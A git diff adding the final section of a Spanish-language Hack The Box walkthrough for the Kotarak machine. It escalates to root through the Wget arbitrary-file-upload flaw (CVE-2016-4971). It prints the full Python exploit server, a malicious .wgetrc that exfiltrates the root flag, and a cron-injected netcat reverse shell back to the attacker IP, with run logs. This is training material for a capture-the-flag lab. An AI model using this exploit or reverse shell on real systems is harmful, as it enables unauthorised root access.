@@ -239,4 +239,164 @@ atanas@kotarak-dmz:/root$ cat app.log
 ```
 Encontramos una peticion a nivel de un servicio http de la ip 10.0.3.133
 
+Procedemos a buscar por `searchsploit wget/1.6`
+```bash
+
+# searchsploit wget 1.16    
+-------------------------------------------------------------------------------------------------------------------------------
+ Exploit Title                                                                                         | Path
+-------------------------------------------------------------------------------------------------------------------------------
+GNU Wget < 1.18 - Access List Bypass / Race Condition                                                  | multiple/remote/40824.py
+GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution                                        | linux/remote/40064.txt
+--------------------------------------------------------------------------------------------------------------------------------
+```
+Nos quedamos con el .txt y vemos que tenemos un exploit para un contexto en el que atraves de una peticion por WGET se permite redireccionar a otro archivo cualquiera.
+Procedemos de la siguiente manera:
+1.- nos creamos en nuestra maquina un archivo llamado `.wgetrc` en el cual le vamos a solicitar la flag de root.txt y vamos a injectar una tarea cron 
+```bash
+# cat .wgetrc                              
+post_file = /root/root.txt
+output_document = /etc/cron.d/wget-root-shell
+```
+Tenemos que hacer uso del siguiente exploit desde la maquina victima que viene dado en el `.txt` encontrado con searchsploit
+```python
+# cat exp1.py 
+#!/usr/bin/env python
+
+#
+# Wget 1.18 < Arbitrary File Upload Exploit
+# Dawid Golunski
+# dawid( at )legalhackers.com
+#
+# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
+#
+# CVE-2016-4971 
+#
+
+import SimpleHTTPServer
+import SocketServer
+import socket;
+
+class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
+   def do_GET(self):
+       # This takes care of sending .wgetrc
+
+       print "We have a volunteer requesting " + self.path + " by GET :)\n"
+       if "Wget" not in self.headers.getheader('User-Agent'):
+          print "But it's not a Wget :( \n"
+          self.send_response(200)
+          self.end_headers()
+          self.wfile.write("Nothing to see here...")
+          return
+
+       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
+       self.send_response(301)
+       new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
+       print "Sending redirect to %s \n"%(new_path)
+       self.send_header('Location', new_path)
+       self.end_headers()
+
+   def do_POST(self):
+       # In here we will receive extracted file and install a PoC cronjob
+
+       print "We have a volunteer requesting " + self.path + " by POST :)\n"
+       if "Wget" not in self.headers.getheader('User-Agent'):
+          print "But it's not a Wget :( \n"
+          self.send_response(200)
+          self.end_headers()
+          self.wfile.write("Nothing to see here...")
+          return
+
+       content_len = int(self.headers.getheader('content-length', 0))
+       post_body = self.rfile.read(content_len)
+       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)
+
+       print "Sending back a cronjob script as a thank-you for the file..." 
+       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
+       self.send_response(200)
+       self.send_header('Content-type', 'text/plain')
+       self.end_headers()
+       self.wfile.write(ROOT_CRON)
+
+       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"
+
+       return
+
+HTTP_LISTEN_IP = '0.0.0.0'  # modificamos este valor para que este a la escucha por cualquier conexion entrante
+HTTP_LISTEN_PORT = 80
+FTP_HOST = '10.10.14.12'   # ponemos nuestra IP
+FTP_PORT = 21
+
+# Le metemos una Reverse_shell como tarea cron para que nos la ejecute
+ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 443 >/tmp/f"
+
+handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)
+
+print "Ready? Is your FTP server running?"
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+result = sock.connect_ex((FTP_HOST, FTP_PORT))
+if result == 0:
+   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
+else:
+   print "FTP is down :( Exiting."
+   exit(1)
+
+print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT
+
+handler.serve_forever()
+```
+Procedemos a ejecutar el exp1.py en la maquian victima
+```bash
+atanas@kotarak-dmz:/tmp$ ls
+exp1.py  hsperfdata_tomcat  systemd-private-3e9e26f3a6f84a9a9b909400a5690811-systemd-timesyncd.service-AdlnuJ  vmware-root
+atanas@kotarak-dmz:/tmp$ authbind python exp1.py 
+Ready? Is your FTP server running?
+FTP found open on 10.10.14.12:21. Let's go then
+
+Serving wget exploit on port 80...
+
+
+We have a volunteer requesting /archive.tar.gz by GET :)
+
+Uploading .wgetrc via ftp redirect vuln. It should land in /root 
+
+10.0.3.133 - - [20/Jul/2021 10:46:01] "GET /archive.tar.gz HTTP/1.1" 301 -
+Sending redirect to ftp://anonymous@10.10.14.12:21/.wgetrc 
+
+We have a volunteer requesting /archive.tar.gz by POST :)
+
+Received POST from wget, this should be the extracted /etc/shadow file: 
+
+---[begin]---
+ 950d1425795dfd38272c9XXXXXXXXXXXX   ------------ FLAG DE ROOT -------------
+ 
+---[eof]---
+
+
+Sending back a cronjob script as a thank-you for the file...
+It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)
+10.0.3.133 - - [20/Jul/2021 10:48:01] "POST /archive.tar.gz HTTP/1.1" 200 -
+
+File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) 
+```
+Server FTP montado desde nuestro Kali para alojar el `.wgetrc` donde van las instrucciones maliciosas (EJECUTAR ESTO ANTES QUE EL EXPLOIT)
+```
+─(root💀kali)-[/home/…/HTB/OSCP/Kotarak/exploits]
+└─# python3 -m pyftpdlib -p21 -w
+/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
+  warnings.warn("write permissions assigned to anonymous user.",
+[I 2021-07-20 16:44:46] concurrency model: async
+[I 2021-07-20 16:44:46] masquerade (NAT) address: None
+[I 2021-07-20 16:44:46] passive ports: None
+[I 2021-07-20 16:44:46] >>> starting FTP server on 0.0.0.0:21, pid=6124 <<<
+[I 2021-07-20 16:45:13] 10.10.10.55:56700-[] FTP session opened (connect)
+[I 2021-07-20 16:45:59] 10.10.10.55:34470-[] FTP session opened (connect)
+[I 2021-07-20 16:45:59] 10.10.10.55:34470-[anonymous] USER 'anonymous' logged in.
+[I 2021-07-20 16:46:00] 10.10.10.55:34470-[anonymous] RETR /home/Escritorio/HTB/OSCP/Kotarak/exploits/.wgetrc completed=1 bytes=73 seconds=0.032
+[I 2021-07-20 16:46:00] 10.10.10.55:34470-[anonymous] FTP session closed (disconnect).
+```
+
+Maquina Rooteada =D 
+
 
